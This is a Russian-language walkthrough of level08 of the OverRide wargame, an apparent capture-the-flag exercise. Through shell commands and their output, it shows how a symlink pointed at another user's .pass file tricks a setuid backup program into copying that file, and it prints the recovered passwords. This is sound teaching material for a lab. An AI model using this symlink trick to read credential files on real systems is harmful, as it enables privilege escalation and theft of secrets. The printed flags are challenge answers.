[back](../defense.md)

Через линк можно скопировать пароль

level07@OverRide:~$ su level08
Password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08

level08@OverRide:~$ cd /home/users/level08

level08@OverRide:~$ ls -la
	dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
	dr-x--x--x  1 root    root      260 Oct  2  2016 ..
	drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
	-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
	-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
	-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
	-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
	-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo

Мы видим директорию backups
level08@OverRide:~$ ls -la backups/
	-rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log

level08@OverRide:~$ cat backups/.log
	LOG: Starting back up: 

level08@OverRide:~$ ./level08
	Usage: ./level08 filename
	ERROR: Failed to open (null)

Когда мы запускаем ./level08 filename, этот файл копируется в директорию backups
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ echo "trurgot-kmarg" > tk
level08@OverRide:~$ ./level08 tk
level08@OverRide:~$ cat backups/tk
	trurgot-kmarg

Также логируется
level08@OverRide:~$ cat backups/.log
	LOG: Starting back up: tk
	LOG: Finished back up tk

Попробуем бэкапнуть пароль, использовав его в качестве параметра
level08@OverRide:~$ ./level08 /home/users/level09/.pass
	ERROR: Failed to open ./backups//home/users/level09/.pass

Это не получилось? так как путь содержит "//", файл должен находиться в текущей директории.

Попробуем в домашнем каталоге создать символическую ссылку на ```/home/users/level09/.pass```. 
level08@OverRide:~$ ln -s /home/users/level09/.pass pass
level08@OverRide:~$ ls -la
	drwxrwxrwx+ 1 level08 level08   140 Dec  3 15:34 .
	dr-x--x--x  1 root    root      260 Oct  2  2016 ..
	drwxrwx---+ 1 level09 users      80 Dec  3 15:22 backups
	-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
	-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
	lrwxrwxrwx  1 level08 level08    25 Dec  3 15:34 pass -> /home/users/level09/.pass
	-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
	-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
	-r--r-----+ 1 level08 level08    14 Dec  3 15:21 tk
	-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo

Теперь мы можем запустить двоичный файл по символической ссылке, 
и он создаст резервную копию файла паролей в папке ```backups/```.
level08@OverRide:~$ ./level08 pass
level08@OverRide:~$ cat backups/pass
	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

level08@OverRide:~$ su level09
Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09

level09@OverRide:~$ cd /home/users/level09
level09@OverRide:~$ ls -la

[back](../defense.md)
